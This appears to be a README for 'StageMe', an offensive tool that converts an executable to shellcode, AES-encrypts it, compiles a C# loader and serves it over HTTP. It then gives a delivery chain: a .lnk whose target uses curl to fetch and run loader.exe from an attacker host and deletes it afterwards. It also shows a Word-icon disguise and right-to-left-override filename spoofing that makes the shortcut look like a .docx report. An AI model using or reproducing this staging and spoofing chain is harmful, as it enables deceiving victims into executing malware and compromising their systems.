#### **Setup**
```
❯ git clone https://github.com/orbixio/StageMe.git
❯ cd StageMe
❯ python main.py --install
```

#### **Usage**
```
❯ python main.py --help

███████╗████████╗ █████╗  ██████╗ ███████╗
██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝
███████╗   ██║   ███████║██║  ███╗█████╗
╚════██║   ██║   ██╔══██║██║   ██║██╔══╝   |\    /|  ____
███████║   ██║   ██║  ██║╚██████╔╝███████╗ | \  / | |____
╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ |  \/  | |____

usage: main.py [-h] [-p payload_file] [-T template] [-H host] [-P port] [--install]

options:
  -h, --help            show this help message and exit
  -p payload_file, --payload payload_file
  -T template, --template template
  -H host, --host host  Specify the IP address the server will bind to (default: 0.0.0.0).
  -P port, --port port  Specify the port the server will listen on (default: 8080).
  --install             Install needed tools & modules

❯ python main.py -H 127.0.0.1 -P 8000 -p payload\main.exe -T templates\default.cs

███████╗████████╗ █████╗  ██████╗ ███████╗
██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝
███████╗   ██║   ███████║██║  ███╗█████╗
╚════██║   ██║   ██╔══██║██║   ██║██╔══╝   |\    /|  ____
███████║   ██║   ██║  ██║╚██████╔╝███████╗ | \  / | |____
╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ |  \/  | |____

┏━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Configuration ┃ Value                                             ┃
┡━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ Payload File  │ C:\Users\Orbixio\Desktop\StageMe\payload\main.exe │
│ Host          │ 127.0.0.1                                         │
│ Port          │ 8000                                              │
└───────────────┴───────────────────────────────────────────────────┘
[i] Converting payload to shellcode... [+] DONE !
[i] Converting shellcode to hex... [+] DONE !
[#] Encrypting payload with AES Encryption ...
IV: E0C228E816E095B167D8C45F1F3B6932
Key: A245D60C3CD4A8B41E21F4E11DA27B2A428FCD7505ED4987C7713CDF9F506B2E

[#] Compiling C# Loader ...
[i] Executable Path: C:\Users\Orbixio\Desktop\StageMe\payload\loader\bin\Release\net8.0\win-x64\publish\loader.exe


[#] Communication KEY: 75fe59ef4612b6f4a473add453a2aa52
[#] File size being served: 596000 bytes
[#] Starting httpd on port 8000...
127.0.0.1 - - [13/Oct/2024 22:14:29] "GET / HTTP/1.1" 200 -
<REDACTED>
```

You can host the loader on a python server:
```
❯ cd
C:\Users\Orbixio\Desktop\StageMe\payload\loader\bin\Release\net8.0\win-x64\publish
❯ python -m http.server 4444
Serving HTTP on :: port 4444 (http://[::]:4444/) ...
```

Then create a .lnk file that directs to:
```
C:\Windows\System32\cmd.exe /c "curl  http://{ATTACKER_IP}:{ATTACKER_PORT}/loader.exe -o C:\Windows\Temp\Loader.exe" && cmd /c C:\Windows\Temp\Loader.exe && cmd /c rm C:\Windows\Temp\Loader.exe
```

Then set icon of a docx file through following steps:

`Properties` > `Change Icon` > `%ProgramFiles%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\wordicon.exe` > Select the icon from the list

Then you can use rtlo extension spoofing:
```
❯ python
Python 3.11.7 (main, Dec  7 2023, 09:09:57)  [GCC UCRT 13.2.0 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import os, shutil
>>> filename, extension = os.path.splitext("Payload.lnk")
>>> filename
'Payload'
>>> extension
'.lnk'
>>> spoofed_extension = ".docx"
>>> reverse = spoofed_extension[::-1]
>>> reverse
'xcod.'
>>> newname = f"2024 Important Report\u202e{reverse}{extension}"
>>> newname
'2024 Important Report\u202excod..lnk'
>>> shutil.copy("Payload.lnk", newname)
'2024 Important Report\u202excod..lnk'
```

